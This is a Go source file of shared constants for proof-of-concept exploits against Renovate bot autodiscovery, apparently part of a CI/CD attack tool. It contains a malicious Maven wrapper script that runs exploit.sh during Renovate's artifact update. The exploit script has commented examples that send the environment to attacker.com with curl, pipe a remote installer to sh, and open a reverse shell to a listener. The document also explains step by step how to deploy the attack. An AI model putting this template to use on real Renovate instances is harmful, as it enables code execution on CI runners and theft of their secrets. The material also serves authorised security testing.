package renovate

// Shared constants and templates for Renovate autodiscovery exploit PoCs
// Used by both GitHub and GitLab implementations

// RenovateJSON is a minimal renovate.json configuration file
const RenovateJSON = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ],
    "prConcurrentLimit": 0,
    "prHourlyLimit": 0
}
`

// PomXML is a minimal pom.xml file with an outdated dependency
const PomXML = `
<project xmlns="http://maven.apache.org/POM/4.0.0"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>pipeleek-autodiscovery-poc</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.12</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project>
`

// MvnwScript is a malicious Maven wrapper script that executes during Renovate's artifact update phase
const MvnwScript = `#!/bin/sh
# Malicious Maven wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Maven wrapper update

# Execute exploit
sh exploit.sh

# Continue with a fake maven command to avoid errors
echo "Maven wrapper executed"
exit 0
`

// MavenWrapperProperties specifies an outdated Maven wrapper version that triggers updates
const MavenWrapperProperties = `distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.8.1/apache-maven-3.8.1-bin.zip
wrapperUrl=https://repo.maven.apache.org/maven2/org/apache/maven/wrapper/maven-wrapper/3.1.0/maven-wrapper-3.1.0.jar
`

// ExploitScript is a proof-of-concept script that demonstrates code execution
const ExploitScript = `#!/bin/sh
# Create a proof file to verify execution
echo "Exploit executed at $(date)" > /tmp/pipeleek-exploit-executed.txt
echo "Working directory: $(pwd)" >> /tmp/pipeleek-exploit-executed.txt
echo "User: $(whoami)" >> /tmp/pipeleek-exploit-executed.txt

echo "Exploit executed during Renovate autodiscovery"
echo "Replace this with your actual exploit code"
echo "Examples:"
echo "  - Exfiltrate environment variables"
echo "  - Read CI/CD secrets"
echo "  - Access secrets from the runner"

# Example: Exfiltrate environment to attacker server
# curl -X POST https://attacker.com/collect -d "$(env)"

# Example: reverse shell using https://github.com/frjcomp/gots (commented out by default)
# curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
# ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
`

// ExploitExplanation provides information about how the exploit works
const ExploitExplanation = `This exploit works by using an outdated Maven wrapper version that triggers Renovate to run './mvnw wrapper:wrapper'
When Renovate updates the wrapper, it executes our malicious mvnw script which runs exploit.sh
Make sure to update the exploit.sh script with the actual exploit code
Then wait until the created repository/project is renovated by the invited Renovate Bot user`
